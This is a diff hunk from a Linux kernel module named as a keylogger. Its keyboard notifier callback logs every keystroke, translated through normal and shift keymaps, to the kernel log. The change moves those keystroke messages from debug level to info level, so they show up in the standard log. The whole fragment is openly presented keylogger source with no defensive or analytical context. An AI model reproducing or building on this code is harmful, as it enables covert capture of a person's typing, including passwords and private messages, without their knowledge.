@@ -58,9 +58,9 @@ int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_p
             //acquire lock to read the global variable shiftKeyDepressed
             down(&sem);
             if(shiftKeyDepressed == 0)
-                printk(KERN_DEBUG "%s \n", keymap[param->value]);
+                printk(KERN_INFO "%s \n", keymap[param->value]);
             else
-                printk(KERN_DEBUG "%s \n", keymapShiftActivated[param->value]);
+                printk(KERN_INFO "%s \n", keymapShiftActivated[param->value]);
             up(&sem);
         }
     }
